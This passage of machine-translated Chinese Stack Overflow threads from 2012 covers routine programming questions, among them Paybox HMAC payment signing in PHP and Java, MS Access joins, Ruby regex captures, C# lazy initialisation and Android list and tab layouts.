我已经阅读了很多关于桥接的内容，这似乎不适用于我的情况。在我看来，上面的代码分配对象并且从不释放它们，至少这可以解释内存警告。

任何帮助表示赞赏。

# asp.net-mvc-3 - MVC3，脚手架控制器，模型下拉菜单中的可用选项

> ID：11651378
> 
> 赞同：0
> 
> 时间：2012-07-25T13:55:15.657
> 
> 标签：asp.net-mvc-3, scaffolding

我有一个引用 WCF Web 服务的 MVC3 项目......并且该 WCF 服务引用了一个数据类库。

当我尝试构建控制器时，我可以选择从下拉列表中选择模型类。

我希望看到在我的数据类库中定义的数据类，但它们不存在。我对此感到困惑。我认为这是因为 MVC 项目引用了 WCF 服务，该服务引用了可供选择的类的数据类库。

我错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:25:43.047

我有什么听起来像同样的问题。看看这个答案并验证你没有发生完全相同的事情[尝试添加强类型视图在 MVC 项目中找不到任何类](https://stackoverflow.com/questions/3773774/attempting-to-add-a-strongly-typed-view-does-not-find-any-classes-in-the-mvc-pro)

# php - 支付箱集成

> ID：11651381
> 
> 赞同：1
> 
> 时间：2012-07-25T13:55:40.253
> 
> 标签：php, integration, credit-card

我尝试集成[Paybox](http://www1.paybox.com/)信用卡交易解决方案。

我已经尝试了至少 100 种不同的解决方案（不是在开玩笑），但没有一个有效，每次我得到“Problème d'identification du commerce。Accès refusé ！” 消息（法语）。

这是我拥有的最“稳定”的代码：

```
<?php

function gen_hmac($site, $rang, $identifiant, $devise, $cmd, $porteur, $hash, $time, $total, $retour, $key) {
    $msg = "PBX_SITE=". $site 
        ."&PBX_RANG=". $rang 
        ."&PBX_IDENTIFIANT=". $identifiant 
        ."&PBC_TOTAL=". $total 
        ."&PBX_DEVISE=". $devise 
        ."&PBC_CMD=". $cmd 
        ."&PBC_PORTEUR=". $porteur 
        ."&PBC_RETOUR=". $retour 
        ."&PBC_HASH=". $hash 
        ."&PBC_TIME=" . $time ; 
        $binkey = pack("H*", $key);
        echo "<!-- " . $msg . " -->";
        $hmac = strtoupper(hash_hmac('sha512', $msg, $binkey));
        echo "<!-- " . $hmac . " -->";
    return $hmac;
}

    // static
    $site = 1999888;
    $rang = 32;
    //$identifiant = 110647233;
    $identifiant = 107904482;
    $devise = 978;
    $hash = "SHA512";
    $key = "0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF";
    $cmd = "TEST Paybox";
    $porteur = "test@paybox.com";
    $time = date("c");
    //$time = "2011-02-28T11:01:50+01:00";

    // variable
    $total = 1000;
    //$retour = "ref:R;trans:T;auto:A;tarif:M;abonnement:B;pays:Y;erreur:E";
    $retour = "Mt:M;Ref:R;Auto:A;Erreur:E";
    $hmac = gen_hmac($site, $rang, $identifiant, $devise, $cmd, $porteur, $hash, $time, $total, $retour, $key);

?>

<html>
<head>
<title>Paybox TEST</title>
</head>
<body>
<?php
//print_r(hash_algos());    
?>
<form method="POST" action="https://preprod-tpeweb.paybox.com/cgi/MYchoix_pagepaiement.cgi">
<!--<form method="POST" action="https://preprod-tpeweb.paybox.com/cgi/MYframepagepaiement_ip.cgi">-->
<!--<form method="POST" action="https://preprod-tpeweb.paybox.com/cgi/ChoixPaiementMobile.cgi">-->
    <input type="hidden" name="PBX_SITE" value="<?php echo $site; ?>" />
    <input type="hidden" name="PBX_RANG" value="<?php echo $rang; ?>" />
    <input type="hidden" name="PBX_IDENTIFIANT" value="<?php echo $identifiant; ?>" />
    <input type="hidden" name="PBX_TOTAL" value="<?php echo $total; ?>" />
    <input type="hidden" name="PBX_DEVISE" value="<?php echo $devise; ?>" />
    <input type="hidden" name="PBX_CMD" value="<?php echo $cmd; ?>" />
    <input type="hidden" name="PBX_PORTEUR" value="<?php echo $porteur; ?>" />
    <input type="hidden" name="PBX_RETOUR" value="<?php echo $retour; ?>" />
    <input type="hidden" name="PBX_HASH" value="<?php echo $hash; ?>" />
    <input type="hidden" name="PBX_TIME" value="<?php echo $time; ?>" />
    <input type="hidden" name="PBX_HMAC" value="<?php echo $hmac; ?>" />
    <!--<input type="hidden" name="PBX_REFUSE" value="http://test.fr/" />
    <input type="hidden" name="PBX_ANNULE" value="http://test.fr/" />
    <input type="hidden" name="PBX_EFFECTUE" value="http://test.fr/" />-->
    <input type="submit" value="envoyer" />
</form>
</body>
</html> 
```

大多数静态值来自 paybox 测试文档。

那么您知道我的代码有什么问题吗，或者您知道如何详细了解发送到 paybox 服务器的内容有什么问题吗？

真挚地

**编辑：** 关于我的目标的更多细节。我真正需要的是用 java 编写代码，但我在 php 中有一些代码示例最终有所帮助。

现在我尝试找出如何在 java 中生成一个干净的 hmac/sha512。

```
<?php 
$key = "0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF";
$binkey = pack("H*", $key); 
echo strtoupper(hash_hmac('sha512', "ABC", $binkey)); 
?> 
```

输出：100A6A016A4B21AE120851D51C93B293D95B7D8A44B16ACBEFC2D1C9DF02B6F54FA3C2D6802E52FED5DF8652DDD244788A204682D2D1CE861FDA4E67F2792643

那么我怎样才能在 java 中重新创建相同的 hmac 算法呢？

我尝试了很多东西，但没有人达到我的目标，但这是我目前所拥有的：

```
private String generateHMAC( String datas )
    {

        //                final Charset asciiCs = Charset.forName( "utf-8" );
        Mac mac;
        String result = "";
        try
        {
            byte[] bytesKey = PayboxConstants.KEY.getBytes( );
            final SecretKeySpec secretKey = new SecretKeySpec( bytesKey, "HmacSHA512" );
            mac = Mac.getInstance( "HmacSHA512" );
            mac.init( secretKey );
            final byte[] macData = mac.doFinal( datas.getBytes( ) );
            byte[] hex = new Hex( ).encode( macData );
            result = new String( hex, "ISO-8859-1" );
        }
        catch ( final NoSuchAlgorithmException e )
        {
            AppLogService.error( e );
        }
        catch ( final InvalidKeyException e )
        {
            AppLogService.error( e );
        }
        catch ( UnsupportedEncodingException e )
        {
            AppLogService.error( e );
        }

        return result.toUpperCase( );

    } 
```

但它的输出是：AA6492987D7A7AC81109E877315414806F1973CC47B897ECE713171A25A11B279329B1BFF39EA72A5EFB7EDCD71D1F34D5AAC49999A780BD13F019ED99685B80

这绝对不等同于“克隆”的 php hmac 算法。

那么我可以在我的 java 代码中添加什么以使其符合其 php 等价？

**编辑：** 实际上我设法让所有东西一起工作，我在这里可用：http: [//dev.lutece.paris.fr/plugins/plugin-paybox/index.html](http://dev.lutece.paris.fr/plugins/plugin-paybox/index.html)

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2017-11-10T11:56:20.283

```
<section class="rl-box">
    <div class="container padd-xs-0">
        <div class="content-section1">
            <div class="left-cont col-md-12 col-sm-12">

                <div class="container-fluid">

                    <?php
                    $PBX_SITE = "1999888";
                    $PBX_RANG = "32";
                    $PBX_IDENTIFIANT = "your identifiant id";
                    $secretKeyTest = "0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF";
                    $PBX_PORTEUR = "your-email";
                    $PAYBOX_DOMAIN_SERVER = "tpeweb.paybox.com";
                    $dateTime = date("c");

                    $PBX_TOTAL = 4000; //$_POST["PBX_TOTAL"];   // Amount
                    $PBX_DEVISE = 978;
                    //$PBX_CMD = $_POST["PBX_CMD"]."|".$_POST["user"]."|".$_POST["typed"]."|".$_POST["period"]."|".$_POST["id"]; // order ID no.                          
                    $PBX_CMD = 1; // order ID no.Eg: userid,order_id

                    $PBX_RETOUR = "Mt:M;Ref:R;Auto:A;Erreur:E";
                    $PBX_HASH = "SHA512";
                    $PBX_TIME = $dateTime;

                    //$PBX_EFFECTUE = "http://www.leader-underwriting.eu/payment/payment.php";

                    $msg = "PBX_SITE=$PBX_SITE" .
                            "&PBX_RANG=$PBX_RANG" .
                            "&PBX_IDENTIFIANT=$PBX_IDENTIFIANT" .
                            "&PBX_TOTAL=$PBX_TOTAL" .
                            "&PBX_DEVISE=$PBX_DEVISE" .
                            "&PBX_CMD=$PBX_CMD" .
                            "&PBX_PORTEUR=$PBX_PORTEUR" .
                            "&PBX_RETOUR=$PBX_RETOUR" .
                            "&PBX_HASH=$PBX_HASH" .
                            "&PBX_TIME=$PBX_TIME";

                    $binKey = pack("H*", $secretKeyTest);
                    $hmac = strtoupper(hash_hmac('sha512', $msg, $binKey));

                    $cuu = str_replace(",", "", $ramount);
                    ?>                             
                    <form method="POST" name="form_payment" action="https://preprod-tpeweb.paybox.com/cgi/MYchoix_pagepaiement.cgi">

                        <input type="hidden" name="PBX_SITE" value="<?php echo $PBX_SITE; ?>">
                        <input type="hidden" name="PBX_RANG" value="<?php echo $PBX_RANG; ?>">
                        <input type="hidden" name="PBX_IDENTIFIANT" value="<?php echo $PBX_IDENTIFIANT; ?>">
                        <input type="hidden" name="PBX_TOTAL" value="<?php echo $PBX_TOTAL; ?>"> <!--dynamic-->
                        <input type="hidden" name="PBX_DEVISE" value="<?php echo $PBX_DEVISE; ?>">
                        <input type="hidden" name="PBX_CMD" value="<?php echo $PBX_CMD; ?>">  <!--dynamic-->
                        <input type="hidden" name="PBX_PORTEUR" value="<?php echo $PBX_PORTEUR ?>">
                        <input type="hidden" name="PBX_RETOUR" value="<?php echo $PBX_RETOUR; ?>">
                        <input type="hidden" name="PBX_HASH" value="<?php echo $PBX_HASH; ?>">
                        <input type="hidden" name="PBX_TIME" value="<?php echo $PBX_TIME; ?>">
                        <input type="hidden" name="PBX_HMAC" value="<?php echo $hmac; ?>">
                        <button type="submit" class="btn btn-primary payment">
                            Payer
                        </button> 
                    </form>

                    <center>

                    </center>

                </div>

            </div>

        </div> <!-- .container-fluid -->

    </div>               

</div>
</div>
</section> 
```

# ms-access - 有没有办法在 Microsoft Access 中将整数连接到始终包含整数的字符串

> ID：11651382
> 
> 赞同：2
> 
> 时间：2012-07-25T13:55:41.757
> 
> 标签：ms-access

在 Microsoft Access 中，我有两个无法更改其结构的链接表。

其中一个表包含整数格式的 ID，另一个包含相同的 ID，但采用字符串格式。

我想加入这些领域，但显然，MS Access 不允许我这样做。

有没有办法，可能使用铸造或类似的东西来创建这个连接？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:00:06.857

如果`ID`是 autonumber in`t1`和 text in `t2`，您可以`CLng()`在`ON`表达式中使用转换`t2.ID`为长整数。

```
SELECT *
FROM
t1 INNER JOIN t2
ON t1.ID = CLng(t2.ID); 
```

或者您可以使用`Val()`而不是`CLng()`其他`ID`数字类型。

我不确定查询设计器在设计视图中与此协作的效果如何，但您可以在 SQL 视图中进行。

OTOH，您可能更喜欢创建一个单独的查询“qryT2”，用于`t2`将文本 ID 转换为数字。

```
SELECT CLng(ID) AS numeric_ID, t2.*
FROM t2; 
```

然后，您可以在第一个查询中替换`qryT2`，`t2`并使用查询设计者认为更合适的查询。

```
SELECT *
FROM
t1 INNER JOIN qryT2 
ON t1.ID = qryT2.numeric_ID; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-25T13:59:44.200

转到`View > SQL View`设计器中，并将您的联接子句更改为：

```
ON CSTR(IntegerID) = StringID 
```

当然，您的 ID 名称可能会有所不同，但您应该了解这个想法。

# silverlight - 嵌套的 Silverlight 变换的执行顺序是什么？

> ID：11651385
> 
> 赞同：3
> 
> 时间：2012-07-25T13:55:43.857
> 
> 标签：silverlight, xaml, transformation, silverlight-5.0

我在嵌套的 silverlight 控件中使用 CompositeTransforms 并看到了意想不到的结果。

这是 XAML 的简化示例：

```
<Grid x:Name="ContainerControl" RenderTransformOrigin="0,0">
  <Grid.RenderTransform>
    <CompositeTransform Rotation="{Binding Rotation}"/>
  </Grid.RenderTransform>
  <Rectangle Width="50" Height="50" Fill="RoyalBlue" DataContext="{Binding Child}">
    <Rectangle.RenderTransform>
      <CompositeTransform TranslateX="{Binding XTranslation}" TranslateY="{Binding YTranslation}"/>
    </Rectangle.RenderTransform>
  </Rectangle>
</Grid> 
```

使用非常简单的对象：

```
public class TestData
{
    public decimal Rotation { get { return 90; } }

    public TestChild Child { get { return new TestChild(); } }
}

public class TestChild
{
    public decimal XTranslation { get { return 20; } }
    public decimal YTranslation { get { return 30; } }
} 
```

我假设子对象（矩形）将应用其平移变换，然后父对象（网格）将旋转整个事物。然而，这不是我所看到的。嵌套转换的执行顺序是什么？我怎样才能轻松地强迫它按我期望的方式工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T20:39:32.357

在进一步研究这一点时，我已经确认绑定在层次结构中自上而下得到解决。也就是说，父绑定在子绑定之前得到解决。我通过在绑定代码中放置断点并查看哪个首先被击中来看到这一点。

但是，我意识到绑定分辨率和渲染步骤是分开的。仅仅因为绑定以错误的顺序发生并不意味着渲染以意外的方式发生。

我已经追踪到我的具体问题与其他问题有关。不过，我希望这个例子展示了一些有用的行为。

# c# - 如何获取站点元素值？

> ID：11651388
> 
> 赞同：0
> 
> 时间：2012-07-25T13:55:50.687
> 
> 标签：c#, html-agility-pack

我遇到了一个带有以下 html 行的站点：

```
<span id="isLive" style="display:none;">true</span> 
```

问题是，直到现在我才真正需要找到它的值，通常参数都很好，所以我在这里不知所措。如果 ID 为 isLive 的跨度是唯一的，如每个站点一个，我如何获得“真”或“假”？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:03:49.150

使用[HTML 敏捷包](http://htmlagilitypack.codeplex.com/)：

```
HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
doc.Load(//Load document);

var isLive = doc.DocumentNode.Descendants("span").Where(d => d.Attributes.Contains("id") && d.Attributes["id"].Value.Contains("isLive")).SingleOrDefault();

string result = isLive.InnerText; 
```

# ruby - 在 ruby 1.8 中使用正则表达式从字符串中提取多个值的正确方法

> ID：11651395
> 
> 赞同：3
> 
> 时间：2012-07-25T13:56:16.947
> 
> 标签：ruby, regex, string, ruby-1.8

我对 ruby​​ 比较陌生，我试图找出基于正则表达式中的分组从字符串中提取多个值的“ruby”方法。我正在使用 ruby​​ 1.8（所以我认为我没有命名捕获）。

我可以匹配然后分配 $1,$2 - 但我觉得必须有一种更优雅的方式（毕竟这是 ruby​​）。

我也有一些使用 grep 的东西，但它看起来很hackish，因为我使用的是一个数组并且只是抓住了第一个元素：

```
input="FOO: 1 BAR: 2"
foo, bar = input.grep(/FOO: (\d+) BAR: (\d+)/){[$1,$2]}[0]
p foo
p bar 
```

我尝试过在线搜索并浏览[ruby​​ 文档](http://ruby-doc.org/core-1.8.7/Enumerable.html)，但无法找到更好的答案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:02:16.583

Rubys [String#match](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-match)方法返回一个[MatchData](http://www.ruby-doc.org/core-1.9.3/MatchData.html)对象，该方法[捕获](http://www.ruby-doc.org/core-1.9.3/MatchData.html#method-i-captures)返回一个捕获数组。

```
>> string = "FOO: 1 BAR: 2"
=> "FOO: 1 BAR: 2"
>> string.match /FOO: (\d+) BAR: (\d+)/
=> #<MatchData "FOO: 1 BAR: 2" 1:"1" 2:"2">
>> _.captures
=> ["1", "2"]
>> foo, bar = _
=> ["1", "2"]
>> foo
=> "1"
>> bar
=> "2" 
```

总结：

```
foo, bar = input.match(/FOO: (\d+) BAR: (\d+)/).captures 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:10:46.470

改用扫描：

```
input="FOO: 1 BAR: 2"

input.scan(/FOO: (\d+) BAR: (\d+)/) #=> [["1", "2"]] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:05:20.390

任何一个：

```
foo, bar = string.scan(/[A-Z]+: (\d+)/).flatten 
```

或者：

```
foo, bar = string.match(/FOO: (\d+) BAR: (\d+)/).captures 
```

# c# - 按需或在构造函数中创建属性对象？

> ID：11651399
> 
> 赞同：-1
> 
> 时间：2012-07-25T13:56:28.413
> 
> 标签：c#, .net, properties

在 C# 中为没有设置器的属性初始化对象的最佳方法是什么？

例如，我有 UserData 类型的属性，我可以初始化它：

1.  在构造函数中
2.  在吸气剂中

    ```
    private UserData _user;

    public UserData User  
    {  
        get  
        {  
            return _user?? (_user= new UserData ());  
        }  
    } 
    ```

3.  初始化字段：

    `private UserData _user = new UserData()`

我发现很少有类似的线程：
[在构造函数中创建对象或在类](https://stackoverflow.com/questions/4219759/create-an-object-in-the-constructor-or-at-top-of-the-class)
[C# 成员变量初始化的顶部；最佳实践？](https://stackoverflow.com/questions/298183/c-sharp-member-variable-initialization-best-practice)

但这是第一个和第三个选项之间的考虑 - 没有人考虑第二个选项 - 你知道吗？一段时间以来，获取对象是我的首选，但我想知道是否有一些我不知道的缺点。

你能告诉我什么是最好的选择，什么问题可以利用第二个选项？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:08:57.687

这完全取决于你想用它做什么，所以有明确的答案。

1+3 和 2 之间的一个区别是可预测性。
使用 1+3，您可以准确地知道创建对象的位置以及类实例化的时间点。在某些情况下，这可能是可取的。
使用 2，您依赖外部影响（谁在何时访问该属性）来初始化该字段。

通过方法 2 中的延迟创建（仅在需要时创建对象），您可以在创建包含类的对象时节省一些时间。

如果`UserData`的创建需要很长时间，例如，当您必须为它查询数据库时，您可能希望将其创建延迟到真正需要时。包含对象的`UserData`对象构造得更快，因为它不需要等待`UserData`对象被创建。如果不总是访问该属性，您甚至可以完全避免创建`UserData`实例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:42:17.247

#2 的一个问题是，如果该属性可以被多个线程访问，那么您可能会创建 UserData 对象的两个副本。#2 的另一个考虑因素是，如果 UserData 的创建成本很高，您将在访问属性时而不是在创建包含对象时支付创建该对象的成本。根据您的用例，这可能需要也可能不需要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:17:32.463

如果您只是使用纯数据，则首选在其定义处初始化支持字段（如果可能）：

```
// when you create constructor N+1, no worries about forgetting to set the value
private UserData _userData = new UserData();

public UserData User
{
    get { return _userData; }
} 
```

如果您需要延迟初始化，最好的选择是使用[`Lazy<T>`](http://msdn.microsoft.com/en-us/library/dd642331.aspx)：

```
private Lazy<UserData> _userData = new Lazy<UserData>(() => new UserData());

public UserData User
{
    get { return _userData.Value; }
} 
```

的构造函数`Lazy<T>`包含可以满足您的线程安全需求的重载：

*   `None`：来自多个线程的访问是“未定义的行为”
*   `PublicationOnly`：第一个完成初始化的线程“获胜”
*   `ExecutionAndPublication`: 锁确保只有一个线程初始化值

# entity-framework - Automapper DTO 到实体嵌套映射

> ID：11651400
> 
> 赞同：0
> 
> 时间：2012-07-25T13:56:29.380
> 
> 标签：entity-framework, automapper, dto

我有实体：

```
public class Person
 {
   //properties
   public virtual State State { get; set; }
 }

 public class State
 {
       //properties
       public int StateId { get; set; }
       public string StateName { get; set; }
       public virtual Address Address{ get; set; }
 }

public class Address
 {
       //properties
       public int AddressId { get; set; }
       public string City{ get; set; }
       public int PostalCode { get; set; }       
 } 
```

我有一个名为 PersonDetails 的扁平 DTO

```
public class PersonDetails
 {
       //properties
       public string City { get; set; }
       public string StateName { get; set; }
       public int PostalCode { get; set; }       
 } 
```

当我进行映射时，它可以工作，但它会为 Person 实体创建一个新的 State 和 Adress。

我将如何使用 AutoMapper 映射 from `PersonDetails`to `PersonEntity`？

# android - 没有 TabHost 的 Android TabWidget 和自定义操作

> ID：11651415
> 
> 赞同：4
> 
> 时间：2012-07-25T13:57:38.187
> 
> 标签：android, android-layout, android-tabs

可以在没有 TabHost 的情况下使用 TabWidget 吗？我想要类似旧手机的 ActionBar 故障恢复的选项卡导航。

所以我只想显示用户选项卡并听取点击操作，我会在其中获得活动选项卡 ID。而已。

我知道在常见情况下，用于 actionBar 的 TabsNavigatin 仅用于浏览片段。但我很容易避免使用 Fragments。：

```
class mTabListener implements ActionBar.TabListener {

    private Screen screen;

    public mTabListener(Screen screen) {
        this.screen = screen;
    }

    public void onTabReselected(Tab tab, FragmentTransaction ft) {
        screen.onTabReselected(tab, ft);
    }

    public void onTabSelected(Tab tab, FragmentTransaction ft) {
        screen.onTabSelected(tab, ft);
    }

    public void onTabUnselected(Tab tab, FragmentTransaction ft) {
        screen.onTabUnselected(tab, ft);
    }

}

public abstract class Screen extends Activity {    
protected void addTab(String title, int what, boolean selected) {
    if (Global.API < 11)
        return;

    ActionBar bar = getActionBar();
    Tab tab = bar.newTab()
        .setTag(new Integer(what))
        .setTabListener(new mTabListener(this))
        .setText(title);

    bar.addTab(tab, selected);
}

    public void onTabReselected(ActionBar.Tab tab, FragmentTransaction ft) {

    }

    public void onTabSelected(ActionBar.Tab tab, FragmentTransaction ft) {
        Integer what = (Integer)tab.getTag();
        tabSelected(what);
    }

    public void onTabUnselected(ActionBar.Tab tab, FragmentTransaction ft) {

    }

    public void tabSelected(int what) {

    }
} 
```

但我找不到如何将标签按钮添加到 TabWidget；

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-11T11:45:56.793

这是解决方案，没有 tabHost 的 TabWidget

[https://github.com/muratonnet/android-SingleTabWidget](https://github.com/muratonnet/android-SingleTabWidget)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:02:27.080

不。没有选项卡主机的选项卡小部件就像使用选项卡的按钮一样。您将完成标签导航的操作。

# android - 如何在列表视图中分离页眉/页脚和数据？

> ID：11651416
> 
> 赞同：0
> 
> 时间：2012-07-25T13:57:40.133
> 
> 标签：android

我的应用程序需要在列表中显示数据，我浏览了一些教程并想出使用 header.xml 和 row.xml。它工作正常，但现在我想在我的 header.xml 上添加更多内容，我发现整个 header.xml 也随着 row.xml 滚动，我真的不想要。任何不需要我完全重写和更改代码样式的解决方案？

活动：

公共类 HistoryActivity 扩展 ListActivity {

```
private static final String TAG = "HistoryActivity";
ListView lv;
SimpleAdapter sd;

RecordDAO dao = new RecordDAO(HistoryActivity.this);

@Override
protected void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);

    lv = getListView();
    lv.addHeaderView(getLayoutInflater().inflate(
            R.layout.header, null, false));

}

@Override
protected void onResume()
{
    super.onResume();
    ArrayList<Record> Records = new ArrayList<Record>();
    Records = (ArrayList<Record>) dao.findAll();

    ArrayList<HashMap<String, String>> aList = new ArrayList<HashMap<String, String>>();
    HashMap<String, String> map;

    for (int x = Records.size()-1; x >=0; x--)
    {
        map = new HashMap<String, String>();
        map.put(....// all my data 

        aList.add(map);
    }

    sd = new SimpleAdapter(this, aList, R.layout.row,
            new String[]
            { "date", "name", "time",
                    "rating" }, new int[]              
            { R.id.date, R.id.name, R.id.time,
                     R.id.rating});

    lv.setAdapter(sd);

    lv.setOnItemClickListener(new OnItemClickListener()
    {

        public void onItemClick(AdapterView<?> arg0, View view, int arg2,
                long arg3)
        {
            TextView tx = (TextView) view.findViewById(R.id.date);
            String s = tx.getText().toString();
            Intent intent = new Intent(HistoryActivity.this, EditRecordActivity.class);
            intent.putExtra("date", s);
            startActivity(intent);

        }
    });

}

private void insertNewRecord()
{
    dao.add(newRecord);
} 
```

}

header.xml：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:clickable="true"
    android:orientation="vertical" >

    <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:clickable="true"
        android:orientation="horizontal"
        android:paddingBottom="6dip"
        android:paddingTop="4dip" >

        <TextView
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Date"
            android:textColor="#FFFFFF"
            android:textSize="16dp" />

        <TextView
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="name"
            android:textColor="#FFFFFF"
            android:textSize="16dp" />

        <TextView
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Time"
            android:textColor="#FFFFFF"
            android:textSize="16dp" />

        <TextView
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Rating"
            android:textColor="#FFFFFF"
            android:textSize="16dp" />
    </LinearLayout>

</LinearLayout> 
```

行.xml：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="horizontal"
    android:paddingBottom="6dip"
    android:paddingTop="4dip" >

    <TextView
        android:id="@+id/date"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:textColor="#FFFFFF" />

    <TextView
        android:id="@+id/name"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_marginLeft="15dp"
        android:layout_weight="1"
        android:textColor="#FFFFFF" />

    <TextView
        android:id="@+id/time"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:textColor="#FFFFFF" />

    <TextView
        android:id="@+id/Rating"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:textColor="#FFFFFF" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:10:28.920

不要使用 ListActivity。我认为这是一个不好的做法。使用常规活动。只需将 ID 为“@android:id/list”的 ListView 插入 header.xml。

```
<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:clickable="true"
    android:orientation="horizontal"
    android:paddingBottom="6dip"
    android:paddingTop="4dip" >

    <TextView
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="Date"
        android:textColor="#FFFFFF"
        android:textSize="16dp" />

    <TextView
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="name"
        android:textColor="#FFFFFF"
        android:textSize="16dp" />

    <TextView
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="Time"
        android:textColor="#FFFFFF"
        android:textSize="16dp" />

    <TextView
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:text="Rating"
        android:textColor="#FFFFFF"
        android:textSize="16dp" />
</LinearLayout>

<ListView
    android:id="@android:id/list"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >
</ListView> 
```

您可以通过以下方式获取列表参考： ListView lv = (ListView)findViewById(R.id.list);

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:19:11.117

设置 ListView 的 Header 意味着它将成为列表的第一项，但仍会随着列表本身滚动。

在您的情况下，您可以创建某种布局（类似于 header.xml）并将其放在 ListView 上方。

1.  而不是`ListActivity`, 扩展自`Activity`
2.  创建定义一些视图和 ListView 的 main_layout.xml。

主布局

```
<include header.xml/>
<listview> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:22:41.863

如果您不希望您的页眉和页脚视图与您的 一起滚动，请`ListView`确保在调用您的方法之前使用`addHeaderView()`and 。我建议将该方法移至您的方法。`addFooterView()``setAdapter()``setAdapter()``onCreate()`

# android - 上下文操作栏 - 摆脱选择操作文本

> ID：11651417
> 
> 赞同：1
> 
> 时间：2012-07-25T13:57:41.477
> 
> 标签：android, android-layout, android-actionbar

我已经实现了一个上下文操作栏。onCreateActionMode 中加载和膨胀的菜单定义如下：

```
<?xml version="1.0" encoding="utf-8"?>
<menu xmlns:android="http://schemas.android.com/apk/res/android"
 android:title="@string/call_context_menu_title">
<item android:id="@+id/menu_answer_call"
    android:title="@string/answerCall"
    android:showAsAction="ifRoom" />
<group android:id="@+id/activeCallContextMenuItems">
<item android:id="@+id/menu_end_call"
      android:title="@string/hangupCall"
      android:showAsAction="ifRoom"/>
<group android:id="@+id/multipleActiveCallsContextMenuItems">
  <item android:id="@+id/menu_transfer_call"
        android:title="@string/transferCall"
        android:showAsAction="ifRoom"/>
  <item android:id="@+id/menu_conference_call"
        android:title="@string/conferenceCall"
        android:showAsAction="ifRoom"/>
</group>
</group>
</menu> 
```

当我单击 ListView 中的项目时，会显示这些项目。当它处于活动状态时，除了列出我的 4 个选项外，它还会在第一个菜单项之前放置一个“选择操作”文本。有什么方法可以让 Android 不显示“选择操作”提示？菜单项有自我解释的文字，所以它是多余的（如果提示在中间被切断，甚至会令人困惑......例如在我的 S3 上它说“选择......”然后我有我的菜单项）

# c# - UBound 数组 vb6 转换为 C#

> ID：11651418
> 
> 赞同：3
> 
> 时间：2012-07-25T13:57:49.177
> 
> 标签：c#, visual-studio-2010, vb6, vb6-migration

我在 VB6 中有以下代码：

```
Dim frpdReport() As REPORTDEF

For iCounter = 0 To UBound(frpdReport)

    With frpdReport(iCounter)
        If .iReportID = iReportID Then
            fGetReportFile = .tReportFile
        End If
    End With
Next iCounter 
```

我转换成这个 C# 代码：

```
REPORTDEF[] frpdReport = new REPORTDEF[6];
 for (iCounter = 0; iCounter < Convert.ToInt32(frpdReport[6]); iCounter++)
    {
        if (frpdReport[iCounter].iReportID == iReportID)
        {
            fGetReportFile_return = frpdReport[iCounter].tReportFile;
        }

    }
    return fGetReportFile_return; 
```

调试时，我在 for 语句中收到以下错误 - “索引超出了数组的范围。” 而且我不知道为什么，因为数组的索引是 6。

请问有什么帮助吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:04:45.787

为什么不使用 .length 属性？

```
 for (iCounter = 0; iCounter < frpdReport.Length; iCounter++) 
```

或者如果您不需要计数器值，则为每个

```
foreach (REPORTDEF frpReportItem in frpdReport) 
```

或者，如果您正在寻找特定项目，请使用 LINQ

```
REPORTDEF fGetReportFile_return = frpdReport.Where( fR => fR.iReportID == iReportID).Single(); 
```

* * *

## 回答 #2

> 赞同：2
